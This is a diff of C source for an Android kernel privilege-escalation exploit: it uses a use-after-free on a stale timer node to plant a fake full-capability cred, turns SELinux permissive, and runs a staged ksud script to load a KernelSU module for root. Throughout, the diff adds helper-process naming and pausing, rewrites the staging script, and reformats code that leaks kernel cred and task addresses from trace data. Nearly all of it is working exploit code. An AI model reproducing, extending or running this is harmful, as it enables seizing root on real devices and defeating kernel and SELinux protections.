@@ -22,8 +22,8 @@
  *     Point task->cred at a fake full-capability cred in the reclaimed
  *     order-1 page, then fix uid/gid.  The child forks a worker; fork's
  *     prepare_creds() normalizes cred/real_cred and allocates a real SELinux
- *     blob.  The worker execs ksud late-load, which resolves the installed
- *     manager's libksud.so and loads the matching android15-6.6 module.
+ *     blob. The worker runs the selected manager's staged ksud payload to
+ *     late-load the matching module for the configured KMI.
  *     The parent parks with its socket buffers holding the fake cred page.
  *
  * The trigger leaves a stale timerqueue node; every failed plant parks
@@ -83,6 +83,7 @@ struct child_report
 };
 
 static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
+static char g_helper_name[16];
 static _Atomic int g_exec_tid, g_target_tgid;
 static void *g_frag_base;
 static size_t g_frag_len;
@@ -694,6 +695,7 @@ static int locker_fn(void *x)
     int prot = PROT_NONE;
     unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
     (void)x;
+    prctl(PR_SET_NAME, g_helper_name, 0, 0, 0);
     pin(slot ? 3 : 1);
     while (!atomic_load(&g_go))
         sched_yield();
@@ -709,6 +711,7 @@ static int killer_fn(void *x)
 {
     int tid, tgid;
     (void)x;
+    prctl(PR_SET_NAME, g_helper_name, 0, 0, 0);
     pin(2);
     while (!(tid = atomic_load(&g_exec_tid)))
         sched_yield();
@@ -836,8 +839,54 @@ static long now_ms(void)
     return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
 }
 
+/* Preserve helper mappings; terminating them can release state still held by the run. */
+static void pause_owned_helpers(void)
+{
+    DIR *processes = opendir("/proc");
+    struct dirent *entry;
+    int paused = 0;
+    if (!processes)
+    {
+        logf("[!] cannot enumerate Timer helpers errno=%d\n", errno);
+        return;
+    }
+    while ((entry = readdir(processes)))
+    {
+        char name[32] = {0};
+        if (entry->d_name[0] < '0' || entry->d_name[0] > '9')
+            continue;
+        if (atoi(entry->d_name) == getpid())
+            continue;
+        /* The proc directory pins the process identity even if its PID is recycled. */
+        int process = openat(dirfd(processes), entry->d_name, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
+        if (process < 0)
+            continue;
+        int comm = openat(process, "comm", O_RDONLY | O_CLOEXEC);
+        if (comm >= 0)
+        {
+            ssize_t n = read(comm, name, sizeof(name) - 1);
+            close(comm);
+            if (n > 0)
+            {
+                name[strcspn(name, "\n")] = '\0';
+                if (!strcmp(name, g_helper_name))
+                {
+                    if (syscall(SYS_pidfd_send_signal, process, SIGSTOP, NULL, 0) == 0)
+                        paused++;
+                    else if (errno != ESRCH)
+                        logf("[!] cannot pause helper pid=%s errno=%d\n", entry->d_name, errno);
+                }
+            }
+        }
+        close(process);
+    }
+    closedir(processes);
+    logf("[+] Timer helper SIGSTOP sent: %d\n", paused);
+}
+
 static void park_forever(const char *why)
 {
+    pause_owned_helpers();
     logf("[!] %s -- parking without reap (zombie held)\n", why);
     fflush(stdout);
     for (;;)
@@ -865,25 +914,12 @@ static void write_ksu_script(void)
         "#!/system/bin/sh\n"
         "echo \"[ksu] start uid=$(id -u) selinux=$(getenforce)\"\n"
         "grep -E '^(Cap|Seccomp)' /proc/self/status\n"
-        "PKG=com.sukisu.ultra\n"
-        "[ -f /data/local/tmp/su_manager_pkg ] && PKG=$(cat /data/local/tmp/su_manager_pkg 2>/dev/null | head -1)\n"
-        "[ -z \"$PKG\" ] && PKG=com.sukisu.ultra\n"
+        "PKG=$(head -n 1 /data/local/tmp/su_manager_pkg 2>/dev/null)\n"
+        "if [ -z \"$PKG\" ]; then echo '[ksu] manager package missing'; exit 1; fi\n"
         "echo \"[ksu] manager pkg=$PKG\"\n"
-        "APK=$(pm path \"$PKG\" 2>/dev/null | head -1 | cut -d: -f2)\n"
-        "echo \"[ksu] apk=$APK\"\n"
-        "KSUD=''\n"
-        "if [ -f /data/local/tmp/ksud_path ]; then KSUD_PINNED=$(cat /data/local/tmp/ksud_path 2>/dev/null | head -1); [ -x \"$KSUD_PINNED\" ] && KSUD=\"$KSUD_PINNED\" && echo \"[ksu] ksud pinned: $KSUD\"; fi\n"
-        /* Keep the app-resolved daemon ahead of legacy manager discovery. */
-        "[ -x \"$KSUD\" ] || KSUD=/data/local/tmp/ksud\n"
-        "[ -x \"$KSUD\" ] || KSUD=$(find /data/app -path \"*/${PKG}*/lib/arm64/libksud.so\" 2>/dev/null | head -1)\n"
-        "if [ ! -x \"$KSUD\" ] && [ -n \"$APK\" ]; then "
-        "KSUD=\"$(dirname \"$APK\")/lib/arm64/libksud.so\"; ls -l \"$KSUD\" 2>&1 | head -1; fi\n"
-        "[ -x \"$KSUD\" ] || KSUD=$(find /data/app -path "
-        "'*/com.sukisu.ultra*/lib/arm64/libksud.so' -o -path '*/me.weishu.kernelsu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
-        "[ -x \"$KSUD\" ] || KSUD=$(find /data/app -name libksud.so -path '*lib/arm64*' 2>/dev/null | head -1)\n"
-        "[ -x \"$KSUD\" ] || KSUD=/data/adb/ksu/bin/ksud\n"
+        "KSUD=$(head -n 1 /data/local/tmp/ksud_path 2>/dev/null)\n"
+        "if [ ! -x \"$KSUD\" ]; then echo '[ksu] ksud missing for selected manager'; exit 1; fi\n"
         "ls -l \"$KSUD\" 2>&1 | head -1\n"
-        "if [ ! -x \"$KSUD\" ]; then echo '[ksu] ksud missing'; pm list packages 2>/dev/null | grep -i -E 'sukisu|kernelsu'; ls /data/app 2>&1 | head -20; exit 1; fi\n"
         "echo \"[ksu] ksud=$KSUD version=$(\"$KSUD\" --version 2>&1 | head -1)\"\n"
         "\"$KSUD\" late-load --kmi android14-6.1 --allow-shell "
         "--package-name \"$PKG\"\n"
@@ -1276,7 +1312,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
             /* c5..c9 = full caps for 6.1 (40,48,56,64,72) */
             for (int i = 5; i <= 9; i++)
                 c[i] = FULLCAP; /* inh/prm/eff/bset/ambient */
-            c[10] = 0; /* jit_keyring + hole */
+            c[10] = 0;          /* jit_keyring + hole */
             *(unsigned long long *)(payload + off + 0x78) =
                 page + blob; /* security (120) */
             *(unsigned long long *)(payload + off + 0x80) =
@@ -1510,12 +1546,18 @@ static unsigned long long leak_cred(unsigned char *raw,
         {
             c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
             tc = scan_task_allocs(raw, (size_t)n, getpid(), &task);
-            if (c == 0 && attempt == 0) {
+            if (c == 0 && attempt == 0)
+            {
                 /* V2352GA cred diag: dump (req,alloc) histogram for this pid */
-                struct { unsigned long long req, alloc; int cnt; } ch[32];
+                struct
+                {
+                    unsigned long long req, alloc;
+                    int cnt;
+                } ch[32];
                 int chn = 0, tot = 0;
                 memset(ch, 0, sizeof(ch));
-                for (size_t i = 16; i + 24 <= (size_t)n; i += 4) {
+                for (size_t i = 16; i + 24 <= (size_t)n; i += 4)
+                {
                     unsigned long long pp, rr, aa;
                     if (u32(raw, i - 12) != (unsigned)p)
                         continue;
@@ -1528,9 +1570,20 @@ static unsigned long long leak_cred(unsigned char *raw,
                     {
                         int f = -1;
                         for (int k = 0; k < chn; k++)
-                            if (ch[k].req == rr && ch[k].alloc == aa) { f = k; break; }
-                        if (f >= 0) ch[f].cnt++;
-                        else if (chn < 32) { ch[chn].req = rr; ch[chn].alloc = aa; ch[chn].cnt = 1; chn++; }
+                            if (ch[k].req == rr && ch[k].alloc == aa)
+                            {
+                                f = k;
+                                break;
+                            }
+                        if (f >= 0)
+                            ch[f].cnt++;
+                        else if (chn < 32)
+                        {
+                            ch[chn].req = rr;
+                            ch[chn].alloc = aa;
+                            ch[chn].cnt = 1;
+                            chn++;
+                        }
                     }
                 }
                 logf("[diag-cred] pid=%d bytes=%ld kptr=%d expect req=%#llx alloc=%#llx\n",
@@ -1563,13 +1616,20 @@ static unsigned long long leak_cred(unsigned char *raw,
                 logf("[diag-hello] poll/hello failed alive=%d errno=%d hello=%#x\n", alive, err, hello);
             }
         }
-        if (attempt == 0 && tc == 0) {
+        if (attempt == 0 && tc == 0)
+        {
             /* task diag for parent pid */
             int me = getpid();
-            struct { unsigned low21; unsigned long long req, alloc; int cnt; } th[32];
+            struct
+            {
+                unsigned low21;
+                unsigned long long req, alloc;
+                int cnt;
+            } th[32];
             int thn = 0, ttot = 0;
             memset(th, 0, sizeof(th));
-            for (size_t i = 8; i + 32 <= (size_t)n; i += 4) {
+            for (size_t i = 8; i + 32 <= (size_t)n; i += 4)
+            {
                 unsigned long long ss, pp, rr, aa;
                 if (u32(raw, i - 4) != (unsigned)me)
                     continue;
@@ -1584,9 +1644,21 @@ static unsigned long long leak_cred(unsigned char *raw,
                     unsigned l = (unsigned)(ss & 0x1fffffULL);
                     int f = -1;
                     for (int k = 0; k < thn; k++)
-                        if (th[k].low21 == l && th[k].req == rr && th[k].alloc == aa) { f = k; break; }
-                    if (f >= 0) th[f].cnt++;
-                    else if (thn < 32) { th[thn].low21 = l; th[thn].req = rr; th[thn].alloc = aa; th[thn].cnt = 1; thn++; }
+                        if (th[k].low21 == l && th[k].req == rr && th[k].alloc == aa)
+                        {
+                            f = k;
+                            break;
+                        }
+                    if (f >= 0)
+                        th[f].cnt++;
+                    else if (thn < 32)
+                    {
+                        th[thn].low21 = l;
+                        th[thn].req = rr;
+                        th[thn].alloc = aa;
+                        th[thn].cnt = 1;
+                        thn++;
+                    }
                 }
             }
             logf("[diag-task] me=%d bytes=%ld kptr=%d expect low21=%#llx taskbytes=%#llx\n",
@@ -1694,7 +1766,7 @@ static int wait_child_main(const char *mode)
 
         /* Fake cred carries kernel SID + FULLCAP. Set SELinux permissive from
          * userspace too (with kernel selinux_state zero-write already done).
-         * Needed for SukiSU ksud late-load. */
+         * Needed for KernelSU ksud late-load. */
         {
             int enforce = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
             if (enforce >= 0)
@@ -1704,11 +1776,11 @@ static int wait_child_main(const char *mode)
             }
         }
 
-        logf("[fake] child uid=%d euid=%d; SukiSU late-load (no mount, no system write)\n",
+        logf("[fake] child uid=%d euid=%d; KernelSU late-load\n",
              rep.uid, rep.euid);
         if (child_safemode)
             run_safemode_disable();
-        /* SukiSU late-load only (V2352GA android14-6.1).
+        /* KernelSU late-load only (V2352GA android14-6.1).
          * GhostLock-style: load GKI driver kernelsu.ko via ksud, then start ksud.
          * NO mount, NO system partition RW, NO AVB trip. Only /data/local/tmp writes. */
         {
@@ -1716,11 +1788,12 @@ static int wait_child_main(const char *mode)
             if (kw == 0)
             {
                 char *const kav[] = {(char *)"sh",
-                                    (char *)"/data/local/tmp/ksu_stage.sh", NULL};
+                                     (char *)"/data/local/tmp/ksu_stage.sh", NULL};
                 execve("/system/bin/sh", kav, envp);
                 _exit(127);
             }
-            if (kw > 0) {
+            if (kw > 0)
+            {
                 int kst = 0;
                 waitpid(kw, &kst, 0);
                 logf("[fake] ksu worker exit=%#x\n", kst);
@@ -1879,6 +1952,7 @@ int main(int argc, char **argv)
     int shell_mode = 0, leak_only = 0, ids_only = 0;
 
     setvbuf(stdout, NULL, _IONBF, 0);
+    snprintf(g_helper_name, sizeof(g_helper_name), "tzh-%d", getpid());
 
     if (argc > 1 && (!strcmp(argv[1], "--help") || !strcmp(argv[1], "-h") ||
                      !strcmp(argv[1], "help")))
@@ -1930,7 +2004,8 @@ int main(int argc, char **argv)
 
     if (discover_page_types(raw) != 0)
         return 1;
-    if (ids_only) {
+    if (ids_only)
+    {
         /* Portable OS diag (no UAF, no plants, no zombies): sysinfo + slabinfo
          * + timer/cred/task trace histograms + base vote. Safe to run on any
          * 6.1/6.6/6.12 build to derive TIMER_SITE_LOW21, CRED_REQ/ALLOC,
@@ -1942,11 +2017,18 @@ int main(int argc, char **argv)
             if (uname(&un) == 0)
                 logf("[diag-sys] %s %s %s %s\n", un.sysname, un.release, un.version, un.machine);
             f = fopen("/proc/version", "r");
-            if (f) { if (fgets(vbuf, sizeof(vbuf), f)) logf("[diag-sys] %s", vbuf); fclose(f); }
+            if (f)
+            {
+                if (fgets(vbuf, sizeof(vbuf), f))
+                    logf("[diag-sys] %s", vbuf);
+                fclose(f);
+            }
             f = fopen("/proc/slabinfo", "r");
-            if (f) {
+            if (f)
+            {
                 char line[256];
-                while (fgets(line, sizeof(line), f)) {
+                while (fgets(line, sizeof(line), f))
+                {
                     if (!strncmp(line, "posix_timers_cache", 18) ||
                         !strncmp(line, "task_struct", 11) ||
                         !strncmp(line, "cred_jar", 8) ||
@@ -1957,9 +2039,21 @@ int main(int argc, char **argv)
                 fclose(f);
             }
             f = fopen("/proc/sys/kernel/panic_on_warn", "r");
-            if (f) { int pv = -1; if (fscanf(f, "%d", &pv) == 1) logf("[diag-sys] panic_on_warn=%d\n", pv); fclose(f); }
+            if (f)
+            {
+                int pv = -1;
+                if (fscanf(f, "%d", &pv) == 1)
+                    logf("[diag-sys] panic_on_warn=%d\n", pv);
+                fclose(f);
+            }
             f = fopen("/sys/fs/selinux/enforce", "r");
-            if (f) { char e = 0; if (fread(&e, 1, 1, f) == 1) logf("[diag-sys] selinux_enforce=%c\n", e); fclose(f); }
+            if (f)
+            {
+                char e = 0;
+                if (fread(&e, 1, 1, f) == 1)
+                    logf("[diag-sys] selinux_enforce=%c\n", e);
+                fclose(f);
+            }
             logf("[diag-sys] expect timer_low21=%#llx timer_alloc=%#llx cred_req=%#llx cred_alloc=%#llx task_low21=%#llx task_bytes=%#llx uid_off=%#llx task_cred=%#llx\n",
                  (unsigned long long)TIMER_SITE_LOW21, (unsigned long long)TIMER_ALLOC,
                  (unsigned long long)CRED_REQ, (unsigned long long)CRED_ALLOC,
@@ -1972,7 +2066,8 @@ int main(int argc, char **argv)
             int me = getpid();
             long n;
             trace_start();
-            for (int i = 0; i < 16; i++) {
+            for (int i = 0; i < 16; i++)
+            {
                 struct sigevent ev;
                 timer_t t;
                 memset(&ev, 0, sizeof(ev));
@@ -1985,13 +2080,21 @@ int main(int argc, char **argv)
             n = read_cpu(g_cpu, raw, 32u << 20);
             logf("[diag] timer probe bytes=%ld pid=%d expect site_low21=%#llx alloc=%#llx\n",
                  n, me, (unsigned long long)TIMER_SITE_LOW21, (unsigned long long)TIMER_ALLOC);
-            if (n > 0) {
+            if (n > 0)
+            {
                 /* histogram of (site_low21, req, alloc) for kernel-ptr records of our pid */
-                struct { unsigned low21; unsigned long long req, alloc; int cnt; unsigned long long ex_site, ex_ptr; } hist[32];
+                struct
+                {
+                    unsigned low21;
+                    unsigned long long req, alloc;
+                    int cnt;
+                    unsigned long long ex_site, ex_ptr;
+                } hist[32];
                 int hn = 0;
                 int total_kptr = 0, match_site = 0, match_alloc = 0;
                 memset(hist, 0, sizeof(hist));
-                for (size_t i = 8; i + 32 <= (size_t)n; i += 4) {
+                for (size_t i = 8; i + 32 <= (size_t)n; i += 4)
+                {
                     unsigned long long site, ptr, req, alloc;
                     if (u32(raw, i - 4) != (unsigned)me)
                         continue;
@@ -2010,9 +2113,23 @@ int main(int argc, char **argv)
                         unsigned l = (unsigned)(site & 0x1fffffULL);
                         int f = -1;
                         for (int k = 0; k < hn; k++)
-                            if (hist[k].low21 == l && hist[k].req == req && hist[k].alloc == alloc) { f = k; break; }
-                        if (f >= 0) hist[f].cnt++;
-                        else if (hn < 32) { hist[hn].low21 = l; hist[hn].req = req; hist[hn].alloc = alloc; hist[hn].cnt = 1; hist[hn].ex_site = site; hist[hn].ex_ptr = ptr; hn++; }
+                            if (hist[k].low21 == l && hist[k].req == req && hist[k].alloc == alloc)
+                            {
+                                f = k;
+                                break;
+                            }
+                        if (f >= 0)
+                            hist[f].cnt++;
+                        else if (hn < 32)
+                        {
+                            hist[hn].low21 = l;
+                            hist[hn].req = req;
+                            hist[hn].alloc = alloc;
+                            hist[hn].cnt = 1;
+                            hist[hn].ex_site = site;
+                            hist[hn].ex_ptr = ptr;
+                            hn++;
+                        }
                     }
                 }
                 logf("[diag] kptr_recs=%d site_match=%d alloc_match=%d hist_n=%d\n", total_kptr, match_site, match_alloc, hn);
@@ -2027,20 +2144,29 @@ int main(int argc, char **argv)
             int go[2], st[2];
             pid_t p = -1;
             long n2 = 0;
-            if (!pipe(go) && !pipe(st)) {
+            if (!pipe(go) && !pipe(st))
+            {
                 trace_start();
                 p = fork();
-                if (p == 0) {
-                    int g2, s2; char ch;
-                    close(go[1]); close(st[0]);
+                if (p == 0)
+                {
+                    int g2, s2;
+                    char ch;
+                    close(go[1]);
+                    close(st[0]);
                     g2 = fcntl(go[0], F_DUPFD, 20);
                     s2 = fcntl(st[1], F_DUPFD, 20);
-                    if (g2 < 0 || s2 < 0) _exit(125);
-                    close(go[0]); close(st[1]);
-                    dup2(g2, 3); close(g2);
-                    dup2(s2, 4); close(s2);
+                    if (g2 < 0 || s2 < 0)
+                        _exit(125);
+                    close(go[0]);
+                    close(st[1]);
+                    dup2(g2, 3);
+                    close(g2);
+                    dup2(s2, 4);
+                    close(s2);
                     pin(g_cpu);
-                    if (read(3, &ch, 1) != 1) _exit(126);
+                    if (read(3, &ch, 1) != 1)
+                        _exit(126);
                     {
                         char *const av[] = {(char *)"/proc/self/exe", (char *)"wait", (char *)"verify", NULL};
                         char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};
@@ -2048,28 +2174,52 @@ int main(int argc, char **argv)
                     }
                     _exit(127);
                 }
-                if (p > 0) {
-                    close(go[0]); close(st[1]);
-                    if (write(go[1], "A", 1) == 1) usleep(50000);
+                if (p > 0)
+                {
+                    close(go[0]);
+                    close(st[1]);
+                    if (write(go[1], "A", 1) == 1)
+                        usleep(50000);
                     trace_stop();
                     n2 = read_cpu(g_cpu, raw, 48u << 20);
-                    if (n2 > 0) {
+                    if (n2 > 0)
+                    {
                         /* cred hist for child pid */
-                        struct { unsigned long long req, alloc; int cnt; } ch[32];
+                        struct
+                        {
+                            unsigned long long req, alloc;
+                            int cnt;
+                        } ch[32];
                         int chn = 0, tot = 0;
                         memset(ch, 0, sizeof(ch));
-                        for (size_t i = 16; i + 24 <= (size_t)n2; i += 4) {
+                        for (size_t i = 16; i + 24 <= (size_t)n2; i += 4)
+                        {
                             unsigned long long pp, rr, aa;
-                            if (u32(raw, i - 12) != (unsigned)p) continue;
-                            pp = u64(raw, i); rr = u64(raw, i + 8); aa = u64(raw, i + 16);
-                            if (!is_kernel_ptr(pp)) continue;
+                            if (u32(raw, i - 12) != (unsigned)p)
+                                continue;
+                            pp = u64(raw, i);
+                            rr = u64(raw, i + 8);
+                            aa = u64(raw, i + 16);
+                            if (!is_kernel_ptr(pp))
+                                continue;
                             tot++;
                             {
                                 int f = -1;
                                 for (int k = 0; k < chn; k++)
-                                    if (ch[k].req == rr && ch[k].alloc == aa) { f = k; break; }
-                                if (f >= 0) ch[f].cnt++;
-                                else if (chn < 32) { ch[chn].req = rr; ch[chn].alloc = aa; ch[chn].cnt = 1; chn++; }
+                                    if (ch[k].req == rr && ch[k].alloc == aa)
+                                    {
+                                        f = k;
+                                        break;
+                                    }
+                                if (f >= 0)
+                                    ch[f].cnt++;
+                                else if (chn < 32)
+                                {
+                                    ch[chn].req = rr;
+                                    ch[chn].alloc = aa;
+                                    ch[chn].cnt = 1;
+                                    chn++;
+                                }
                             }
                         }
                         logf("[diag-cred] pid=%d bytes=%ld kptr=%d expect req=%#llx alloc=%#llx\n",
@@ -2079,22 +2229,45 @@ int main(int argc, char **argv)
                         /* task hist for parent pid */
                         {
                             int me2 = getpid();
-                            struct { unsigned low21; unsigned long long req, alloc; int cnt; } th[32];
+                            struct
+                            {
+                                unsigned low21;
+                                unsigned long long req, alloc;
+                                int cnt;
+                            } th[32];
                             int thn = 0, ttot = 0;
                             memset(th, 0, sizeof(th));
-                            for (size_t i = 8; i + 32 <= (size_t)n2; i += 4) {
+                            for (size_t i = 8; i + 32 <= (size_t)n2; i += 4)
+                            {
                                 unsigned long long ss, pp, rr, aa;
-                                if (u32(raw, i - 4) != (unsigned)me2) continue;
-                                ss = u64(raw, i); pp = u64(raw, i + 8); rr = u64(raw, i + 16); aa = u64(raw, i + 24);
-                                if (!is_kernel_ptr(ss) || !is_kernel_ptr(pp)) continue;
+                                if (u32(raw, i - 4) != (unsigned)me2)
+                                    continue;
+                                ss = u64(raw, i);
+                                pp = u64(raw, i + 8);
+                                rr = u64(raw, i + 16);
+                                aa = u64(raw, i + 24);
+                                if (!is_kernel_ptr(ss) || !is_kernel_ptr(pp))
+                                    continue;
                                 ttot++;
                                 {
                                     unsigned l = (unsigned)(ss & 0x1fffffULL);
                                     int f = -1;
                                     for (int k = 0; k < thn; k++)
-                                        if (th[k].low21 == l && th[k].req == rr && th[k].alloc == aa) { f = k; break; }
-                                    if (f >= 0) th[f].cnt++;
-                                    else if (thn < 32) { th[thn].low21 = l; th[thn].req = rr; th[thn].alloc = aa; th[thn].cnt = 1; thn++; }
+                                        if (th[k].low21 == l && th[k].req == rr && th[k].alloc == aa)
+                                        {
+                                            f = k;
+                                            break;
+                                        }
+                                    if (f >= 0)
+                                        th[f].cnt++;
+                                    else if (thn < 32)
+                                    {
+                                        th[thn].low21 = l;
+                                        th[thn].req = rr;
+                                        th[thn].alloc = aa;
+                                        th[thn].cnt = 1;
+                                        thn++;
+                                    }
                                 }
                             }
                             logf("[diag-task] me=%d bytes=%ld kptr=%d expect low21=%#llx taskbytes=%#llx\n",
@@ -2103,10 +2276,17 @@ int main(int argc, char **argv)
                                 logf("[diag-task] low21=%#x req=%#llx alloc=%#llx cnt=%d\n", th[k].low21, th[k].req, th[k].alloc, th[k].cnt);
                         }
                     }
-                    close(go[1]); close(st[0]);
-                    kill(p, SIGKILL); waitpid(p, NULL, 0);
-                } else {
-                    close(go[0]); close(go[1]); close(st[0]); close(st[1]);
+                    close(go[1]);
+                    close(st[0]);
+                    kill(p, SIGKILL);
+                    waitpid(p, NULL, 0);
+                }
+                else
+                {
+                    close(go[0]);
+                    close(go[1]);
+                    close(st[0]);
+                    close(st[1]);
                 }
             }
         }
@@ -2145,8 +2325,9 @@ int main(int argc, char **argv)
         logf("[+] leak-only run complete\n");
         return 0;
     }
-    if (g_fake_stage) {
-        logf("[+] fake endgame: SukiSU late-load via fake cred (V2352GA)\n");
+    if (g_fake_stage)
+    {
+        logf("[+] fake endgame: KernelSU late-load via fake cred\n");
         write_ksu_script();
     }
     ensure_pool();
@@ -2296,6 +2477,7 @@ int main(int argc, char **argv)
         park_forever("fake cred page held; reboot to clean");
     if (g_held)
         park_forever("root shell finished; failed-plant zombies are held");
+    pause_owned_helpers();
     logf("[+] done\n");
     return 0;
 }
